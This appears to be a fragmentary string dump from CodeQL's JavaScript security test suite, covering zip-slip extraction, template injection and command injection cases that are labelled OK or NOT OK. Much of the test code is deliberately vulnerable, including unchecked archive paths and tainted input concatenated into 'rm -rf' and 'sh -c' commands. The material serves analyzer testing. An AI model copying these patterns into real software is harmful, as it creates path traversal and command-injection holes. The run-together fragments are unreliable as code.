tries()zip.getEntries()zip.getEntrieszipEntr ... e);\n});zipEntr ... me);\n})zipEntries.forEachfunctio ... ame);\n}{\n  fs. ... ame);\n}fs.crea ... yName);fs.crea ... ryName)zipEntry.entryName/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/ZipSlip/TarSlipBad.js'tar-stream'extract'entry'outlinkname'end''finish''finished''./bad.tar'const t ... ream');tar = r ... tream')require ... tream')tar-streamconst e ... ract();extract ... tract()tar.extract()tar.extractextract ... e();\n})extract.onentry(header ... me();\n}{\n  con ... me();\n}const o ... .name);out = f ... r.name)fs.crea ... r.name)header.nameif (hea ... ");\n  }header.linkname{\n    f ... ");\n  }fs.link ... "foo");fs.link ...  "foo")stream.pipe(out);stream.pipe(out)stream.pipestream. ... );\n  })stream.on() => { ... ();\n  }{\n    next();\n  }next();next()stream.resume();stream.resume()stream.resumeextract ... ');\n});extract ... d');\n})()  =>  ... ed');\n}{\n  con ... ed');\n}console ... shed');console ... ished')console.logfs.crea ... tract);fs.crea ... xtract)fs.crea ... ').pipefs.crea ... d.tar')./bad.tar/bad/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/ZipSlip/ZipSlipBad.js'unzip''archive.zip'ParseWriter'fstream'"w"const u ... nzip');unzip = ... unzip')require('unzip')fs.crea ... ;\n  });fs.crea ... );\n  })fs.crea ... )\n  .onfs.crea ... arse())fs.crea ...   .pipefs.crea ... e.zip')unzip.Parse()unzip.Parseentry = ... ));\n  }{\n    c ... ));\n  }const f ... y.path;fileNam ... ry.pathentry.pathentry.p ... Name));entry.p ... eName))entry.pipefs.crea ... leName)var Wri ... Writer;Writer  ... .Writerrequire ... .Writerrequire('fstream')fstreamentry.p ... ame}));entry.p ... Name}))Writer( ... eName}){path: fileName}path: fileNameentry = ... ");\n  }{\n    c ... ");\n  }var fil ... , "w");file =  ... e, "w")fs.open ... e, "w")/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/ZipSlip/ZipSlipBad2.js'path/to/archive.zip'zipContents'output/path/'var fs  ... ('fs');var unz ... nzip');fs.read ... });\n});fs.read ...  });\n})'path/t ... ve.zip'path/to/archive.zippath/to/archive{\n  unz ...   });\n}unzip.P ... ;\n  });unzip.P ... );\n  })unzip.P ... nts).onunzip.P ... ntents)functio ... s);\n  }{\n    v ... s);\n  }var fil ... y.path;'output ... ry.pathoutput/path/fs.writ ... tents);fs.writ ... ntents)entry.contents/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/ZipSlip/ZipSlipBadUnzipper.jsunzipper'unzipper'const u ... pper');unzippe ... ipper')require('unzipper')unzipper.Parse()unzipper.Parsefunctio ... ));\n  }{\n    v ... ));\n  }/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/ZipSlip/ZipSlipGood.js'skipping bad path'const p ... path');if (fil ... ;\n    }fileNam ... ) == -1fileNam ... f('..')fileName.indexOfconsole ... eName);console ... leName)skipping bad pathfs.crea ... ame)));fs.crea ... Name)))path.jo ... eName))path.jo ... leName)fs.crea ... }\n  });fs.crea ...  }\n  })entry = ...   }\n  }{\n    c ...   }\n  }const f ... .path);fileNam ... y.path)path.no ... y.path)if (pat ... ;\n    }path.is ... leName)if (!fi ... .\n    }!fileNa ... th(".")fileNam ... th(".")fileName.startsWith{\n      ... .\n    }fs.crea ... .\n  });fs.crea ... K.\n  })entry = ... OK.\n  }{\n    c ... OK.\n  }entry.p ... ame)));entry.p ... Name)))fs.crea ... eName))path.ba ... leName)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/ZipSlip/ZipSlipGoodBasename.js'my_directory'entry.p ... me))));entry.p ... ame))))my_directory/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-022/ZipSlip/externs.js
 * @param {string} filename
 * @param {*} data
 * @return {void}
 fs.writ ... ta) {};fs.writ ... ata) {}/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-073/tst.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-073 OK // OK 'view engine''hbs''/path'bodyParameterqueryParameter'template'typeof"string"indirect"template"var app ... ss')();app = r ... ess')()require('express')()app.set ... 'hbs');app.set ...  'hbs')app.setview enginehbsapp.pos ... r);\n});app.pos ... er);\n})app.post/pathfunctio ... ter);\n}{\n    v ... ter);\n}var bod ... ameter;bodyPar ... rameterreq.bod ... rameterreq.bodyvar que ... ameter;queryPa ... rameterreq.que ... rameterres.ren ... meter);res.ren ... ameter)if (typ ... K\n    }typeof  ... string"typeof bodyParameter{\n      ... K\n    }res.ren ...  + "");res.ren ... r + "")queryParameter + ""res.ren ... eter});res.ren ... meter}){profil ... ameter}profile ... rameterindirec ... meter);indirec ... ameter){\n    r ... OT OK\n}res.ren ... , obj);res.ren ... ", obj)const s ... j + "";str = obj + ""obj + ""res.ren ... , str);res.ren ... ", str)res.ren ... (str));res.ren ... e(str))JSON.parse(str)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-073/tst2.jshandlebars"express-handlebars"'.hbs'defaultLayout'main'app2app3'pug'app4'ejs'app5"consolidate"whiskers'foobar'app6".html"'html'routerRouterapp7"/router"const h ... bars");handleb ... ebars")require ... ebars")express-handlebarsapp.eng ... ' }) );app.eng ... s' }) )app.engine.hbshandleb ... hbs' }){ defau ... .hbs' }default ...  'main'extname: '.hbs'app.set ... '.hbs')app.pos ...  OK\n});app.pos ... T OK\n}){\n    v ... OT OK\n}app2 =  ... ess')()app2.po ...  OK\n});app2.po ... / OK\n})app2.post{\n    v ... // OK\n}app3 =  ... ess')()app3.se ... 'pug');app3.se ...  'pug')app3.setpugapp3.po ...  OK\n});app3.po ... / OK\n})app3.postapp4 =  ... ess')()app4.se ... 'ejs');app4.se ...  'ejs')app4.setejsapp4.po ...  OK\n});app4.po ... T OK\n})app4.postapp5 =  ... ess')()app5.en ... skers);app5.en ... iskers)app5.enginerequire ... hiskersrequire ... idate")consolidateapp5.se ... obar');app5.se ... oobar')app5.setapp5.po ...  OK\n});app5.po ... T OK\n})app5.postapp6 =  ... ess')()app6.re ... skers);app6.re ... iskers)app6.register.htmlapp6.se ... html');app6.se ... 'html')app6.setapp6.po ...  OK\n});app6.po ... T OK\n})app6.postvar rou ... uter();router  ... outer()express.Router()express.Routerapp7 = express()app7.se ... 'ejs');app7.se ...  'ejs')app7.setrouter. ...  OK\n});router. ... T OK\n})router.postapp7.us ... outer);app7.us ... router)app7.use/router/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/child_process-test.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078 These are technically NOT OK, but they are more likely as false positives// Thes ... sitives NOT OK - but no support for `[].push()` for indirect arguments [INCONSISTENCY] // NOT  ... TENCY]  OK - the alert happens where `args` is build.// OK - ...  build. calls lib/subLib/index.js#foo// call ... .js#fooPATH'win32''cmd.exe''/c''/bin/sh''-c'"-c""/bin/bash""sh""c"/bin"/bash"'/C'myArgswebpackDevServer'webpack-dev-server'compiler"my-sub-lib"var cp  ... 'url');var ser ... ] \n\n});server  ... Y] \n\n})http.cr ... Y] \n\n})functio ... CY] \n\n}{\n    l ... CY] \n\n}let cmd ... y.path;cmd = u ... ry.pathcp.exec("foo");cp.exec("foo")cp.execcp.execSync("foo");cp.execSync("foo")cp.execFile("foo");cp.execFile("foo")cp.execFilecp.exec ... "foo");cp.exec ... ("foo")cp.spawn("foo");cp.spawn("foo")cp.spawncp.spawnSync("foo");cp.spawnSync("foo")cp.spawnSynccp.fork("foo");cp.fork("foo")cp.forkcp.exec(cmd);cp.exec(cmd)cp.execSync(cmd);cp.execSync(cmd)cp.execFile(cmd);cp.execFile(cmd)cp.exec ... c(cmd);cp.execFileSync(cmd)cp.spawn(cmd);cp.spawn(cmd)cp.spawnSync(cmd);cp.spawnSync(cmd)cp.fork(cmd);cp.fork(cmd)cp.exec ... "bar");cp.exec ...  "bar")"foo" + cmd + "bar""foo" + cmdcp.exec ...  cmd});cp.exec ... : cmd}){shell: cmd}shell: cmdcp.exec ... cmd}});cp.exec ...  cmd}}){env: {PATH: cmd}}env: {PATH: cmd}{PATH: cmd}PATH: cmd{cwd: cmd}cwd: cmd{uid: cmd}uid: cmd{gid: cmd}gid: cmdlet sh, flag;if (pro ... = '-c';process ... 'win32'process.platformsh = 'c ... = '/c';sh = 'c ...  = '/c'sh = 'cmd.exe'cmd.exeexeflag = '/c'/csh = '/ ... = '-c';sh = '/ ...  = '-c'sh = '/bin/sh'/bin/shflag = '-c'-ccp.spaw ... cmd ]);cp.spaw ...  cmd ])[ flag, cmd ]let args = [];args = []args[0] = "-c";args[0] = "-c"args[0]args[1] = cmd;args[1] = cmdargs[1]cp.exec ...  args);cp.exec ... , args)/bin/bashrun("sh", args);run("sh", args)args[0] = `-` + "c";args[0] = `-` + "c"`-` + "c"`-``/bin` + "/bash"`/bin`/bashcp.spaw ... cmd]));cp.spaw ...  cmd]))['/C',  ... , cmd])['/C', 'foo'].concat['/C', 'foo']/C["bar", cmd]cp.spaw ... (cmd));cp.spaw ... t(cmd))['/C',  ... at(cmd)let myArgs = [];myArgs = []myArgs. ... + "c");myArgs. ...  + "c")myArgs.pushmyArgs.push(cmd);myArgs.push(cmd)functio ... uild.\n}{\n  cp. ... uild.\n}cp.spawn(cmd, args);cp.spawn(cmd, args)var uti ... "util"){\n    l ... OT OK\n}util.pr ... )(cmd);util.pr ... c)(cmd)util.pr ... p.exec)const w ... rver');webpack ... erver')require ... erver')webpack-dev-servernew web ...   }\n});new web ...    }\n}){\n    b ...     }\n}before: ... ;\n    }functio ... ;\n    }app.use ...     });app.use ...      })app.usecp.exec ... eName);cp.exec ... leName)req.query.fileNamerequire ... eName);require ... leName)require ... b").foorequire ... b-lib")my-sub-lib/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/command-line-parameter-command-injection.js NOT OK (just weird)// NOT  ...  weird) OK - no args provided.// OK - ... ovided. eslint-disable-line// esli ... le-line NOT OK - has flow from tainted1// NOT  ... ainted1 NOT OK - has flow from tianted2// NOT  ... ianted2"cmd.sh "fewerArgsarg0packageDir'app''index.js'node  --option""get-them-args""minimist""yargs""optimist"'yargs''serve [port]''start the server'yargsoption'verbose''Usage: foo bar'tainted1tainted2taint1taint1resttaint2taint2resttaint3taint4minimistsubarg'subarg'yargsParser'yargs-parser''args''arg'specArgumentParser'argparse'parser'Argparse example'add_argument'-f''--foo''foo bar'parse_argscommandLineArgs'command-line-args'optionDefinitionsmeow'meow'clihelpstringdashdash'dashdash'createParser'commander''0.0.1'pizzaTypeCommandvar cp  ... cess");{\n\tcp.e ... OT OK\n}cp.exec ... .argv);cp.exec ... s.argv)process.argvcp.exec ... gv[0]);cp.exec ... rgv[0])process.argv[0]"cmd.sh ... argv[0]cmd.sh sh cp.exec ... gv[1]);cp.exec ... rgv[1])"cmd.sh ... argv[1]process.argv[1]cp.exec ... gv[2]);cp.exec ... rgv[2])"cmd.sh ... argv[2]process.argv[2]var arg ... ice(2);args =  ... lice(2)process ... lice(2)process.argv.slicecp.exec ... gs[0]);cp.execSync(args[0])cp.exec ... rgs[0])"cmd.sh " + args[0]var few ... ice(1);fewerAr ... lice(1)args.slice(1)args.slicefewerArgs[0]"cmd.sh ... Args[0]var arg ... rgs[0];arg0 = fewerArgs[0]cp.execSync(arg0);cp.execSync(arg0)cp.exec ...  arg0);cp.exec ... + arg0)"cmd.sh " + arg0{\n\tcons ... OT OK\n}const a ... ice(2);const s ... x.js');script  ... ex.js')path.jo ... ex.js')cp.exec ... ion"`);cp.exec ... tion"`)`node $ ... ption"`args.join(' ')args.joincp.exec ... ).foo);cp.exec ... ().foo)"cmd.sh ... )().foorequire ... )().foorequire ... rgs")()require ... -args")get-them-argsrequire ... ist")()require("minimist")cp.exec ... v.foo);cp.exec ... gv.foo)"cmd.sh ... rgv.foorequire ... rgv.foorequire ... ").argvrequire("yargs")require("optimist")optimist{\n\tvar  ... OT OK\n}var arg ... \t\t.argvargs =  ... \t\t.argvrequire ... \t\t.argvrequire ... bar" })require ... .optionrequire ... => { })require ... commandrequire('yargs')serve [port]serve [port]start the server(yargs) => { }verbose{ foo: "bar" }foo: "bar"cp.exec ... + args)"cmd.sh " + args"cmd.sh ... e().foorequire ... e().foorequire ... parse()require ... ("foo")require ... ).arrayconst { ... mand();{\n\t\targ ... mmand(){\n\t\targ ... \t\t},\n\t}argv: { ... rgs\n\t\t}{\n\t\t\t...args\n\t\t}require ... mmand()require ... o bar')require ... \t.usageUsage: foo barvar tai ... ).argv;tainted ... ').argvrequire ... ').argvvar tai ... parse()tainted ... parse()const { ... ted2\n\t}{taint1 ... ted2\n\t}{taint1 ... 2rest}}taint1: ... t1rest}{...taint1rest}taint2: ... t2rest}{...taint2rest}{\n\t\ttai ... ted2\n\t}taint1: tainted1taint2: tainted2cp.exec ... 1rest);cp.exec ... t1rest)"cmd.sh ... nt1restcp.exec ... 2rest);cp.exec ... t2rest)"cmd.sh ... nt2restvar {.. ... ).argv;{...tai ... ').argv{...taint3}cp.exec ... aint3);cp.exec ... taint3)"cmd.sh " + taint3var [.. ... ).argv;[...tai ... ').argv[...taint4]cp.exec ... aint4);cp.exec ... taint4)"cmd.sh " + taint4argv =  ... lice(2)var min ... mist");minimis ... imist")cp.exec ... v).foo)"cmd.sh ... gv).foominimist(argv).foominimist(argv)var sub ... barg');subarg  ... ubarg')require('subarg')cp.exec ... )).foo)"cmd.sh ... 2)).foosubarg( ... 2)).foosubarg( ... ice(2))var yar ... rser');yargsPa ... arser')require ... arser')yargs-parseryargsPa ... 2)).fooyargsPa ... ice(2))import  ...  'args'var fla ... .argv);flags = ... s.argv)args.pa ... s.argv)args.parsecp.exec ... s.foo);cp.exec ... gs.foo)"cmd.sh ... ags.fooflags.foovar fla ... spec});flags = ... .spec})require ... .spec})require('arg'){...spec}...specconst { ... arse');{ Argum ... parse'){ ArgumentParser }require('argparse')argparseconst p ... ple'});parser  ... mple'})new Arg ... mple'}){descri ... ample'}descrip ... xample'Argparse exampleparser. ... ar' });parser. ... bar' })parser.add_argument-f--foo{ help: 'foo bar' }help: 'foo bar'foo bar"cmd.sh ... s().fooparser. ... s().fooparser.parse_args()parser.parse_argsconst c ... args');command ... -args')require ... -args')command-line-argsconst o ... tions);options ... itions)command ... itions)cp.exec ... ns.foo)"cmd.sh ... ons.foooptions.fooconst m ... meow');meow =  ... 'meow')require('meow')const c ... ags}});cli = m ... lags}})meow(`h ... lags}})`helpstring`{flags: {...flags}}flags: {...flags}{...flags}...flagscp.exec ... ut[0]);cp.exec ... put[0])"cmd.sh ... nput[0]cli.input[0]cli.inputvar das ... dash');dashdas ... hdash')require('dashdash')var opt ... ions});opts =  ... tions})dashdas ... tions})dashdash.parse{options: options}options: optionscp.exec ... ts.foo)"cmd.sh " + opts.fooopts.foovar par ... ions});parser  ... tions})dashdas ... eParservar opt ... arse();opts =  ... parse()parser.parse()parser.parseconst { ... nder');{ progr ... ander'){ program }require('commander')commanderprogram ... .0.1');program ... 0.0.1')program.version0.0.1cp.exec ... aType);cp.exec ... zaType)"cmd.sh ... zzaTypeprogram ... zzaTypeprogram.opts()program.optsprogram.pizzaType{ Comma ... ander'){ Command }const p ... mand();program ... mmand()new Command()/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/exec-sh.js BAD// BAD'child_process'getShell'cmd''sh'execShconst c ... 'url');cp = re ... ocess')require ... ocess'){\n    i ...     }\n}if (pro ... }\n    }return  ...  '/C' }{ cmd:  ...  '/C' }cmd: 'cmd'arg: '/C'return  ...  '-c' }{ cmd:  ...  '-c' }cmd: 'sh'arg: '-c'functio ... / BAD\n}{\n    v ... / BAD\n}var she ... Shell()shell = getShell()getShell()return  ... ptions)cp.spaw ... ptions)shell.cmd[shell.arg, command]shell.arghttp.cr ... d);\n});http.cr ... md);\n})functio ... cmd);\n}{\n    l ... cmd);\n}execSh(cmd);execSh(cmd)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/exec-sh2.jsfunctio ... "sh";\n}{\n    return "sh";\n}return "sh";{\n    r ... / BAD\n}["-c", command]/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/execSeries.jsasyncEachiterateexecEachcommandsvar exe ... ).exec;exec =  ... ').execrequire ... ').execfunctio ... })();\n}{\n  var ... })();\n}var i = 0;(functi ...   })();(functi ... \n  })()(functi ... );\n  })functio ... });\n  }{\n    i ... });\n  }iterato ...     });iterato ... \n    })arr[i++]if (i < ... erate);i < arr.lengtharr.lengthprocess ... erate);process ... terate)process.nextTickfunctio ... T OK \n}{\n  asy ... T OK \n}asyncEa ... mand));asyncEa ... mmand))(comman ... ommand)exec(command)require ... ]);\n});require ... d]);\n})require ... eServerfunctio ... md]);\n}{\n  let ... md]);\n}cmd = r ... ry.pathrequire ... ry.pathrequire ... , true)require('url').parseexecEach([cmd]);execEach([cmd])[cmd]/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/form-parsers.js parse a file upload// pars ...  upload / file / field// / file / fieldmulter'multer''uploads/''/profile'single'avatar'"touch "originalname'/photos/upload''photos'Busboy'busboy'busboy'file'fieldnamemimetype8000formidable'formidable''/api/upload'multiplesfieldsform2IncomingFormmultiparty'multiparty'Form'part'part8080var mul ... lter');multer  ... ulter')require('multer')var upl ... s/' });upload  ... ds/' })multer( ... ds/' }){ dest: 'uploads/' }dest: 'uploads/'uploads/exec =  ... ").execrequire ... ").exec/profileupload. ... vatar')upload.singleavatar{\n  exe ... OT OK\n}exec("t ... lname);exec("t ... alname)"touch  ... nalnametouch req.fil ... nalnamereq.fileapp.pos ...  })\n});app.pos ...   })\n})/photos/uploadupload. ... s', 12)upload.arrayphotosfunctio ... \n  })\n}{\n  req ... \n  })\n}req.fil ... OK\n  })req.files.forEachreq.filesfile => ...  OK\n  }{\n    e ...  OK\n  }file.originalnamevar htt ... http');var Bus ... sboy');Busboy  ... usboy')require('busboy')http.cr ... (8000);http.cr ... n(8000)http.cr ... .listenhttp.cr ... oy);\n})functio ... boy);\n}{\n  var ... boy);\n}var bus ... ers });busboy  ... ders })new Bus ... ders }){ heade ... aders }headers: req.headersreq.headersbusboy. ... K\n  });busboy. ... OK\n  })busboy.onfunctio ...  OK\n  }exec("t ... ename);exec("t ... lename)"touch " + filenamereq.pipe(busboy);req.pipe(busboy)req.pipeconst f ... able');formida ... dable')require ... dable')app.pos ... });\n});app.pos ...  });\n})/api/upload(req, r ...   });\n}{\n  let ...   });\n}let for ... rue });form =  ... true })formida ... true }){ multiples: true }multiples: trueform.pa ... K\n  });form.pa ... OK\n  })form.parse(err, f ...  OK\n  }exec("t ... .name);exec("t ... s.name)"touch  ... ds.namefields.namelet for ... Form();form2 = ... gForm()new for ... gForm()formida ... ingFormform2.p ... K\n  });form2.p ... OK\n  })form2.parsevar mul ... arty');multipa ... party')require ... party')http.cr ... (8080);http.cr ... n(8080)http.cr ... q);\n\n})functio ... eq);\n\n}{\n  //  ... eq);\n\n}var for ... Form();form =  ... .Form()new mul ... .Form()multiparty.Formform2 = ... .Form()form2.o ... K\n  });form2.o ... OK\n  })form2.on{ // /  ...  OK\n  }"touch  ... ilenamepart.filenameform2.parse(req);form2.parse(req)/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/lib/lib.js/mnt/disk1/t-namanjain/CodeQL/codeql-repo/javascript/ql/test/query-tests/Security/CWE-078/lib NOT OK.// NOT OK. OK.    // OK.     OK - not exported// OK - not exported OK - but FP due to tracking flow through `process.exit()`. [INCONSISTENCY] OK - but FP due to `path.accessSync` not being recognized as a sanitizer. [INCONSISTENCY] unduplicate single-quote at the beginning// undu ... ginning remove non-escaped single-quote if there are enclosed between 2 escaped// remo ... escaped NOT OK - but FN [INCONSISTENCY] This is bad, but the alert location is down in `build`.// This ... build`. OK - the parameter name suggests that it is purposely a shell command.// OK - ... ommand."rm -rf "clacla2lib2"./lib2.js"Cla3staticnotASourcecla3mz"mz/child_process"flowcmd1cmd2myExecstringConcat"for foo in ("") do bla end""cat /foO/BAR/""cat \"""\"""cat '""'""cat '/foo/bar"" some file"args1"node""rm -rf""rm""-rf""rm -rf %s""rm -rf '%s'""rm -rf '/foo/bar/%s'""%s foo/bar""for foo in (%s) do bar end""printf"'rm -rf %s'isValidNameisSafeNameCla4whacla4Cla5cla5indirect2args2editor'inherit'"fo | "sanitizersanitized/'/g"'\\''"broken"'\''""path"guardexistblacklistOfChars/[^A-Za-z0-9_\/:=-]/whitelistOfChars/^[A-Za-z0-9_\/:=-]$/blackList2/^([a-zA-Z0-9]+))?$/trycleanInput/^(?:'')+/g/\\'''/g"\\'"goodSanitizercleanedguard2"prefix/""rm -rf prefix/"sanitizerPropertyFoosanitizeShellString/>/g/</g/\*/g/\?/g/\[/g/\]/g/\|/g/\`/g/$/g/;/g/&/g/\)/g/\(/g/\$/g/#/g/\\/g/\n/gsanitizer2typeofcheck"undefined""MyWindowCommand | findstr /i /c:"unproblematic"test"problematictypeofNumber"number"boundProblem"boundProblem"MyTrainerlearn_argstrain"learn "yetAnohterSanitizer2000'>''<''*''?''['']''|''''$'';''&''('')''#''\\''\t''\n''\'''`''"'sanitizer3shellOptionSPAWN_OPT"first"'-''gm''convert'asyncExec"async-execute"asyncStuffmyFuncsmyFuncblabity'util'installedPath'myBinary -v'splitConcat' my name is ''echo'myCommandcd  ; MyThingmyIndirectThingvar cp  ... ocess")module. ... / OK\n};module. ... // OK\n}{\n\tcp.e ... // OK\n}cp.exec ...  name);cp.exec ... + name)"rm -rf " + namerm -rf cp.exec ... name]);cp.exec ... [name])[name]cp.exec ... , name)module. ... OT OK\n}module.exports.foomodule. ... foo.barfunction cla() { }cla.pro ... OT OK\n}cla.prototype.methodcla.prototypemodule. ...  cla();module. ... w cla()new cla()function cla2() { }cla2.pr ... OT OK\n}cla2.pr ... .methodcla2.prototypemodule. ... cla2();module. ...  cla2()module.exports.blanew cla2()module. ... b2.js")module.exports.lib2require("./lib2.js")./lib2.js/lib2class C ... OK\n\t}\n}constru ... T OK\n\t}(name)  ... T OK\n\t}{\n\t\tcp. ... T OK\n\t}static  ... T OK\n\t}bar(nam ... / OK\n\t}(name)  ... / OK\n\t}{\n\t\tcp. ... / OK\n\t}cp.exec ... ource);cp.exec ... Source)"rm -rf ... ASourcemodule. ... = Cla3;module. ...  = Cla3module.exports.cla3module. ... T OK.\n}module.exports.mzfunctio ... T OK.\n}{\n\trequ ... T OK.\n}require ...  name);require ... + name)mz/child_processmodule. ... md2);\n}module.exports.flowfunctio ... md2);\n}{\n\tvar  ... md2);\n}var cmd ... + name;cmd1 =  ...  + namecp.exec(cmd1);cp.exec(cmd1)cmd2 =  ...  + namefunctio ... md);\n\t}{\n\t\tcp.exec(cmd);\n\t}myExec(cmd2);myExec(cmd2)module. ... .    \n}module. ... gConcatfunctio ... .    \n}{\n\tcp.e ... .    \n}cp.exec(name);cp.exec(name)cp.exec ...  end");cp.exec ... a end")"for fo ... la end""for fo ...  + namefor foo in () do bla end"cat /f ...  + namecat /foO/BAR/cp.exec ... + "\"")"cat \" ...  + "\"""cat \"" + namecat "cp.exec ...  + "'")"cat '" + name + "'""cat '" + namecat '"cat '/ ... e + "'""cat '/ ...  + namecat '/foo/barcp.exec ...  file")name + " some file" some filemodule. ... .arraysvar arg ... node"];args1 = ["node"]["node"]args1.push(name);args1.push(name)args1.pushcp.exec ... (" "));cp.exec ... n(" "))args1.join(" ")args1.join["rm -r ... in(" ")["rm -r ... e].join["rm -rf", name]rm -rf["rm -r ... "].join["rm -r ... + "\""]"\"" + name + "\"""\"" + namecp.exec ...  name])rm["-rf", name]-rfcp.exec ... name));cp.exec ...  name))util.fo ... , name)rm -rf %srm -rf '%s'"rm -rf ... ar/%s'"rm -rf '/foo/bar/%s'%s foo/bar"for fo ... ar end"for foo in (%s) do bar endfor foo in (%s)%s do bar endrequire ... , name)require("printf")printfmodule.exports.validif (!is ... urn;\n\t}!isValidName(name)isValidName(name){\n\t\treturn;\n\t}module.exports.safe!isSafeName(name)isSafeName(name)class C ... ed\n\t}\n}wha(nam ... T OK\n\t}static  ... rted\n\t}(name)  ... rted\n\t}{\n\t\tcp. ... rted\n\t}constru ... rted\n\t}module. ... Cla4();module. ...  Cla4()module.exports.cla4new Cla4()functio ... orted\n}{\n\tcp.e ... orted\n}module. ... Cla5();module. ...  Cla5()module.exports.cla5new Cla5()module. ...  cb);\n}module. ... ndirectfunctio ...  cb);\n}{\n\tlet  ...  cb);\n}let cmd ... + name;cmd = " ...  + namelet sh = "sh";sh = "sh"let arg ... , cmd];args = ["-c", cmd]["-c", cmd]cp.spaw ... s, cb);cp.spaw ... gs, cb)module. ... }\n\t);\n}module. ... direct2functio ... }\n\t);\n}{\n\tlet  ... }\n\t);\n}let cmd = name;cmd = namevar args2 = [cmd2];args2 = [cmd2][cmd2]cp.spaw ... ' }\n\t);cp.spaw ... t' }\n\t)['/C',  ... (args2)['/C',  ... .concat['/C', editor]{ stdio: 'inherit' }stdio: 'inherit'inheritmodule. ... T OK\n\n}module.exports.cmdfunctio ... T OK\n\n}{\n\tcp.e ... T OK\n\n}cp.exec ... mmand);cp.exec ... ommand)"fo | " + commandfo | fo "fo | " + namemodule. ... nitizervar san ... ) + "'"sanitiz ... ) + "'""'" + n ... ) + "'""'" + n ... '\\''")name.re ... '\\''")name.replacecp.exec ... tized);cp.exec ... itized)"rm -rf ... nitizedvar bro ... ) + "'"broken  ... ) + "'""'" + n ... "'\''")name.re ... "'\''")'''cp.exec ... roken);cp.exec ... broken)"rm -rf " + brokenvar pat ... path");path =  ... "path")require("path")module.exports.guardif (!pa ... urn;\n\t}!path.exist(name)path.exist(name)path.exist{\n\t\tcp. ... urn;\n\t}module. ... OK\n\t}\n}module. ... OfCharsfunctio ... OK\n\t}\n}{\n\tcp.e ... OK\n\t}\n}if (/[^ ... / OK\n\t}/[^A-Za ... t(name)/[^A-Za ... ]/.test[^A-Za-z0-9_\/:=-]if (/^[ ... T OK\n\t}/^[A-Za ... t(name)/^[A-Za ... $/.test/^[A-Za ... /:=-]$/^[A-Za-z0-9_\/:=-]$[A-Za-z0-9_\/:=-]module. ... ENCY]\n}module. ... ckList2{\n\tcp.e ... ENCY]\n}if (!/^ ... -1);\n\t}!/^([a- ... t(name)/^([a-z ... t(name)/^([a-z ... $/.test^([a-zA-Z0-9]+)([a-zA-Z0-9]+)[a-zA-Z0-9]+[a-zA-Z0-9]trailing characters{\n\t\tcp. ... -1);\n\t}process.exit(-1);process.exit(-1)process.exittry {\n\t ... urn;\n\t}{\n\t\tpat ... me);\n\t}path.ac ... (name);path.ac ... c(name)path.accessSynccatch ( ... urn;\n\t}var cle ... rn s;\n}cleanIn ... rn s;\n}functio ... rn s;\n}{\n\tif ( ... rn s;\n}if (/[^ ... aped\n\t}/[^A-Za ... test(s){\n\t\ts = ... aped\n\t}s = "'" ...  + "'";s = "'" ... ) + "'""'" + s ... ) + "'""'" + s ... '\\''")s.repla ... '\\''")s.replaces = s.r ... "\\'");s = s.r ...  "\\'")s.repla ...  "\\'")s.repla ... replaces.repla ... /g, '')^(?:'')+(?:'')+(?:'')\\'''return s;var cle ... (name);cleaned ... t(name)cleanInput(name)cp.exec ... eaned);cp.exec ... leaned)"rm -rf " + cleanedvar fs  ... ("fs");module. ... .guard2if (!fs ... urn;\n\t}!fs.exi ... + name)fs.exis ... + name)"prefix/" + nameprefix/"rm -rf ...  + namerm -rf prefix/module. ... ropertycp.exec ... rsion);cp.exec ... ersion)"rm -rf ... versionobj.versionobj.version = "";obj.version = ""module. ... Y]\n\t}\n}module.exports.Fooclass F ... Y]\n\t}\n}start(o ... NCY]\n\t}(opts)  ... NCY]\n\t}{\n\t\tcp. ... NCY]\n\t}cp.exec ... s.bla);cp.exec ... ts.bla)"rm -rf " + opts.blaopts.blathis.opts = {};this.opts = {}this.optsthis.op ... pts.blathis.opts.bla"rm -rf ... pts.blaconstructor() {}functio ... esult\n}{\n  let ... esult\n}let result = str;result = strresult  ... g, "");result  ... /g, "")result. ... /g, "")result.replacereturn resultmodule. ... itizer2{\n  cp. ... // OK\n}var san ... (name);sanitiz ... g(name)module. ... ofcheckif (typ ... T OK\n\t}typeof  ... efined"typeof namemodule. ... md); \n}functio ... md); \n}{\n\tvar  ... md); \n}var cmd ...  + arg;cmd = " ... " + arg"MyWind ... " + arg"MyWind ... /i /c:"MyWindowCommand | findstr /i /c:MyWindowCommand  findstr /i /c:functio ... rn x;\n}{\n\treturn x;\n}return x;module. ... d = id;module. ... id = idmodule.exports.idmodule. ... lematiccp.exec ... est"));cp.exec ... test"))"rm -rf ... "test")id("test")module. ... T OK\n};cp.exec ... id(n));cp.exec ...  id(n))"rm -rf " + id(n)id(n)module. ... K\n\t}\n};module. ... fNumber{\n\tif ( ... OK\n\t}\n}if (typ ... / OK\n\t}typeof  ... number"typeof ncp.exec ... " + n);cp.exec ...  " + n)"rm -rf " + ncp.exec ...  safe);cp.exec ... + safe)"rm -rf " + safecp.exec ... nsafe);cp.exec ... unsafe)"rm -rf " + unsafeObject. ... 